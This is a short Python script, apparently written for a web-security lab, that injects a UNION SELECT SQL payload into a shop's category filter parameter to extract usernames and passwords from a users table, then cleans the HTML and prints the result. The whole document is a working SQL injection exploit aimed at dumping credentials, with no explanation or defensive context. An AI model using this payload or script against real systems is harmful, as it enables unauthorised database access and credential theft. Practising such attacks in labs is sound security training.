import requests
import re

session = requests.Session()
filter_url = input("Enter the category filter URL (ending at /filter): ")

valid_category = "Corporate gifts"
payload = f"{valid_category}' UNION SELECT username, password FROM users--"
params = {'category': payload}

print("[*] Sending UNION SELECT payload...")
response = session.get(filter_url, params=params)
print(f"[*] Status code: {response.status_code}")

html = response.text

html = re.sub(r'<script.*?</script>', '', html, flags=re.DOTALL)
html = re.sub(r'<style.*?</style>', '', html, flags=re.DOTALL)

text_only = re.sub(r'<[^>]+>', '\n', html)

clean_lines = [line.strip() for line in text_only.splitlines() if line.strip()]

print(f"\n[*] Cleaned page content ({len(clean_lines)} lines):\n")
for line in clean_lines:
    print(line)
